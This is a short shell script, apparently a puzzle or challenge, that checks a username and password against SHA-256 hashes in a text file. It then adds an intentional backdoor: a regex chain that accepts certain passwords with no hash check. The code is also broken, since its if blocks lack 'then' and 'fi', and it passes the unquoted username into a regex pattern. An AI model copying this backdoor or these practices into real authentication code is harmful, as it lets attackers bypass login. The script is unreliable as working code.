#!/bin/sh

#this file checks if the password is correct
username=$1
password=$2

hashedPassword=$(cat passwordDB.txt | egrep "^$username " | cut -d' ' -f2)

validPassword=$(echo $password | shasum -a 256 | cut -d' ' -f1 | egrep "^$hashedPassword$")

if [ -n "$validPassword" ]
    echo "sucess"

# regex is security by obsecurity right?
backdoor=$(echo $password | egrep "^(top|bottom)[men]{3}\1$" | egrep -v ".*(.)\1.*" | egrep -v "[en][mn][me]$")
if [ -n "$backdoor" ]
    echo "sucess"


